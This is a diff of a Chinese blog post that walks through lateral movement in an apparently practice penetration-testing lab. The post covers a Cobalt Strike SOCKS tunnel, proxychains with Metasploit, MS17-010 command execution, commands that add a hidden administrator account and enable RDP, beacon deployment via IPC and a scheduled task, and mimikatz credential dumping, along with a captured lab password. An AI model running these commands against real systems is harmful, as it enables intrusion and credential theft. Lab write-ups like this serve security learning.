@@ -112,27 +112,82 @@
 <p>我们可以直接在<code>Credentials</code>模块下看的清清楚楚</p>
 <p><img src="http://static.zybuluo.com/1kbfree/k731frer51wrf3s6eumg4cbs/image_1dvvp5roa15c41ass13h91ga2fbo58.png" alt="image_1dvvp5roa15c41ass13h91ga2fbo58.png-54.5kB"></p>
 <p>这里直接抓取了<code>Administrator</code>的明文密码<code>hongrisec@2019</code></p>
-<h3 id="0x5-横向渗透"><a href="#0x5-横向渗透" class="headerlink" title="0x5.横向渗透"></a>0x5.横向渗透</h3><p>在靶场上作者给出了四点</p>
-<p><img src="http://static.zybuluo.com/1kbfree/69hfubnmw3e1rkwwi4rkjxae/image_1e01jqqhp50apli1kfv4eijg265.png" alt="image_1e01jqqhp50apli1kfv4eijg265.png-159.1kB"></p>
-<p>所以这里要使用到<code>msf</code>，但是<code>Win2k3</code>和<code>Window 2008</code>都是内网主机，我们攻击机的<code>msf</code>无法访问，所以我们要在<code>Window 7</code>上开启一个隧道，将<code>msf</code>带入内网。</p>
+<h3 id="0x5-横向渗透"><a href="#0x5-横向渗透" class="headerlink" title="0x5.横向渗透"></a>0x5.横向渗透</h3><blockquote>
+<p>横向渗透一般就是获取内网其他主机的权限</p>
+</blockquote>
+<p>我比较喜欢用<code>msf</code>来进行横向渗透，所以这里要使用到<code>msf</code>，但是<code>Win2k3</code>和<code>Window 2008</code>都是内网主机，我们攻击机的<code>msf</code>无法访问，所以我们要在<code>Window s7</code>上开启一个隧道，将<code>msf</code>带入内网。</p>
 <h4 id="开通隧道带msf进内网"><a href="#开通隧道带msf进内网" class="headerlink" title="开通隧道带msf进内网"></a>开通隧道带msf进内网</h4><p>1、在<code>cs</code>上开通<code>socks</code>通道</p>
 <p><img src="http://static.zybuluo.com/1kbfree/iomuq72x44nfwt5ezmf6kjy3/image_1e01pagdtc80udk146i3h5mdt6v.png" alt="image_1e01pagdtc80udk146i3h5mdt6v.png-18.9kB"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socks 9999</span></pre></td></tr></table></figure>
 
 <p>2、在攻击机上设置<code>proxychains</code></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">socks4		127.0.0.1 9999</span></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;proxychains.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">socks4    127.0.0.1 9999</span></pre></td></tr></table></figure>
 
 <p><img src="http://static.zybuluo.com/1kbfree/f2n6s5vd142ucl7zqnhr1lf6/image_1e01pciog1o0eup1auiogs1n0l7s.png" alt="image_1e01pciog1o0eup1auiogs1n0l7s.png-69.2kB"></p>
 <blockquote>
 <p>小白肯定会问为什么这里设置的代理是<code>127.0.0.1 9999</code>，因为我<code>cs</code>的服务端是<code>kali</code>，然后在<code>cs</code>执行<code>socks 9999</code>相当于在我<code>kali</code>上开通一个<code>9999</code>的<code>socks</code>代理，然后我<code>kali</code>直接连本地的<code>9999</code>端口就可以了</p>
 </blockquote>
 <p>3、使用代理打开<code>msf</code></p>
-<p><img src="http://static.zybuluo.com/1kbfree/ohtdrx0x3letlmth5cpragyw/image_1e01pibd0bn6124450dk94ba89.png" alt="image_1e01pibd0bn6124450dk94ba89.png-81.9kB"></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains msfconsole</span></pre></td></tr></table></figure>
 
+<p><img src="http://static.zybuluo.com/1kbfree/ohtdrx0x3letlmth5cpragyw/image_1e01pibd0bn6124450dk94ba89.png" alt="image_1e01pibd0bn6124450dk94ba89.png-81.9kB"></p>
 <p>这样<code>msf</code>就成功进内网啦</p>
-<p>然后这里尝试去跑一下<code>MS08-067</code></p>
-<h3 id="先不搞了妈的，老子心态炸了，重启了电脑后win7就不能出网了…"><a href="#先不搞了妈的，老子心态炸了，重启了电脑后win7就不能出网了…" class="headerlink" title="先不搞了妈的，老子心态炸了，重启了电脑后win7就不能出网了…"></a>先不搞了妈的，老子心态炸了，重启了电脑后<code>win7</code>就不能出网了…</h3>]]></content>
+<p>然后这里尝试去跑一下<code>MS08-067</code>（失败）</p>
+<blockquote>
+<p>插播！ 这里用<code>cs</code>的<code>socks</code>代理不稳定，我上传了<code>ew</code>开了<code>1080</code>监听然后也是使用<code>proxychains</code>代理</p>
+</blockquote>
+<h4 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h4><p>因为目标机安装了<code>nmap</code>所以直接跑了</p>
+<p><img src="http://static.zybuluo.com/1kbfree/lfnmz3q6wnvaz9p857vao17h/image_1e02t8sk11o56olo1u6t1fkbr4u23.png" alt="image_1e02t8sk11o56olo1u6t1fkbr4u23.png-46.7kB"></p>
+<p>开启了<code>445</code>端口，然后这里试了下<code>ms08-067</code>，失败告终。</p>
+<h4 id="拿下xp"><a href="#拿下xp" class="headerlink" title="拿下xp"></a>拿下xp</h4><p>然后尝试了<code>admin/smb/ms17_010_command</code>这个模块发现是可以的</p>
+<p><img src="http://static.zybuluo.com/1kbfree/lly0law1gnbzy6k53ejjf1gw/image_1e033nn16l9limi1adcinb18d82g.png" alt="image_1e033nn16l9limi1adcinb18d82g.png-189.3kB"></p>
+<p>然后直接执行添加用户命令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user test @!FuckSEC!@ &#x2F;add</span></pre></td></tr><tr><td class="code"><pre><span class="line">net localgroup administrators test &#x2F;add</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/xtylowsh306as79d8p6k19aw/image_1e033sqmu1hf81jdhh7e1qmq1nog2t.png" alt="image_1e033sqmu1hf81jdhh7e1qmq1nog2t.png-218.3kB"></p>
+<p>查看是否添加成功</p>
+<p><img src="http://static.zybuluo.com/1kbfree/t9ag8mqc9nho2y2hciainmpg/image_1e033u8lj11k4e441j181e5r7i3a.png" alt="image_1e033u8lj11k4e441j181e5r7i3a.png-171kB"></p>
+<p>然后开启他的<code>3389</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2003上开启3389的命令行语句</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span></pre></td></tr></table></figure>
+
+<p>然后使用<code>proxychains</code>连接他的<code>3389</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxychains rdesktop 192.168.52.141</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/guc3xu119n20jh7ba1to2bha/image_1e034uo80138jdrl1u8m6llf2d3n.png" alt="image_1e034uo80138jdrl1u8m6llf2d3n.png-67.6kB"></p>
+<p>然后这里我想让<code>2003</code>系统上上线<code>Cs</code>，操作过程看我这篇文章</p>
+<p><a href="https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" target="_blank" rel="noopener">https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</a></p>
+<h3 id="对xp的信息收集"><a href="#对xp的信息收集" class="headerlink" title="对xp的信息收集"></a>对xp的信息收集</h3><p>常规的信息收集</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ipconfig &#x2F;all</span></pre></td></tr><tr><td class="code"><pre><span class="line">查看网络环境</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/gpxoyw7tc4eyttt7qx1b4bhu/image_1e03itg6pd0b1bmsm6p1cqovlf9.png" alt="image_1e03itg6pd0b1bmsm6p1cqovlf9.png-52.9kB"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">有Primary Dns Suffix 说明是域内 为域机器</span></pre></td></tr></table></figure>
+
+<p>然后查看当前登录域</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net config workstation</span></pre></td></tr></table></figure>
+
+<p><img src="http://static.zybuluo.com/1kbfree/avp8t5tu45uo3e5fk38ehwbm/image_1e03j8gmd1fq5164a1giphl19hum.png" alt="image_1e03j8gmd1fq5164a1giphl19hum.png-14.9kB"></p>
+<p>然后依次类推查询，发现<code>192.168.52.138</code>是主域机器</p>
+<p><img src="http://static.zybuluo.com/1kbfree/6jjbszkack81d6rvx0kqy8br/image_1e03jf691o441elpcjp1uas18en13.png" alt="image_1e03jf691o441elpcjp1uas18en13.png-24.5kB"></p>
+<p>干他！</p>
+<h3 id="对域机器进行渗透"><a href="#对域机器进行渗透" class="headerlink" title="对域机器进行渗透"></a>对域机器进行渗透</h3><h4 id="端口探测-1"><a href="#端口探测-1" class="headerlink" title="端口探测"></a>端口探测</h4><p><img src="http://static.zybuluo.com/1kbfree/npgbj68tsf1xzhgivsxt5hyd/image_1e03jj3fmcpa1109fvg10v0gi51g.png" alt="image_1e03jj3fmcpa1109fvg10v0gi51g.png-50.4kB"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE</span></pre></td></tr><tr><td class="code"><pre><span class="line">53&#x2F;tcp    open  domain</span></pre></td></tr><tr><td class="code"><pre><span class="line">80&#x2F;tcp    open  http</span></pre></td></tr><tr><td class="code"><pre><span class="line">88&#x2F;tcp    open  kerberos-sec</span></pre></td></tr><tr><td class="code"><pre><span class="line">135&#x2F;tcp   open  msrpc</span></pre></td></tr><tr><td class="code"><pre><span class="line">139&#x2F;tcp   open  netbios-ssn</span></pre></td></tr><tr><td class="code"><pre><span class="line">389&#x2F;tcp   open  ldap</span></pre></td></tr><tr><td class="code"><pre><span class="line">445&#x2F;tcp   open  microsoft-ds</span></pre></td></tr><tr><td class="code"><pre><span class="line">464&#x2F;tcp   open  kpasswd5</span></pre></td></tr><tr><td class="code"><pre><span class="line">593&#x2F;tcp   open  http-rpc-epmap</span></pre></td></tr><tr><td class="code"><pre><span class="line">636&#x2F;tcp   open  ldapssl</span></pre></td></tr><tr><td class="code"><pre><span class="line">3268&#x2F;tcp  open  globalcatLDAP</span></pre></td></tr><tr><td class="code"><pre><span class="line">3269&#x2F;tcp  open  globalcatLDAPssl</span></pre></td></tr><tr><td class="code"><pre><span class="line">49154&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49155&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49157&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49158&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49161&#x2F;tcp open  unknown</span></pre></td></tr><tr><td class="code"><pre><span class="line">49167&#x2F;tcp open  unknown</span></pre></td></tr></table></figure>
+
+<h4 id="使用445添加用户"><a href="#使用445添加用户" class="headerlink" title="使用445添加用户"></a>使用445添加用户</h4><p><code>445</code>开放，使用<code>admin/smb/ms17_010_command</code>成功，只能一条一条命令执行…</p>
+<p>然后执行添加用户的语句</p>
+<p><img src="http://static.zybuluo.com/1kbfree/r3r5l230iuqd2nzfju9feu0q/image_1e03kithl13dg11cm14be1v3h1j7t1t.png" alt="image_1e03kithl13dg11cm14be1v3h1j7t1t.png-215.6kB"></p>
+<p>用户还是<code>test</code>密码还是<code>@!FuckSEC!@</code></p>
+<h4 id="使用ipc上传上线马"><a href="#使用ipc上传上线马" class="headerlink" title="使用ipc上传上线马"></a>使用ipc上传上线马</h4><p>这里使用<code>ipc</code>连接上传上线马，然后用计划任务执行该文件</p>
+<p><img src="http://static.zybuluo.com/1kbfree/y5lknl43ut5k6862dyxv54b8/image_1e03klhlrkb3jqu1p674u516sn2a.png" alt="image_1e03klhlrkb3jqu1p674u516sn2a.png-54.7kB"></p>
+<blockquote>
+<p>上线马依旧看这篇文章：<br><a href="https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/" target="_blank" rel="noopener">https://fuckgo.github.io/2020/02/03/%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%8A%E7%BA%BF%E5%8A%9E%E6%B3%95/</a></p>
+</blockquote>
+<h4 id="上线成功"><a href="#上线成功" class="headerlink" title="上线成功"></a>上线成功</h4><p><img src="http://static.zybuluo.com/1kbfree/c6y62wuj455i5orto3o40tpv/image_1e03kt9fo8j519dmi0o1dv6gom2n.png" alt="image_1e03kt9fo8j519dmi0o1dv6gom2n.png-31.7kB"></p>
+<p>然后使用<code>mimikatz</code>跑一下密码</p>
+<p><img src="http://static.zybuluo.com/1kbfree/m8th70gfaxqxkdzf220g05ob/image_1e03l8306hsi1s6u13c2170v1v5d34.png" alt="image_1e03l8306hsi1s6u13c2170v1v5d34.png-141.4kB"></p>
+<p>直接就把域管账号密码跑下来了~</p>
+<p>致此先这里完结一段落，后续学历了<strong>痕迹清理</strong>、<strong>隐藏攻击手段</strong>等技术后再续文缘。</p>
+<p>祝我在内网之旅中开心成长~</p>
+]]></content>
       <categories>
         <category>兴趣爱好</category>
       </categories>
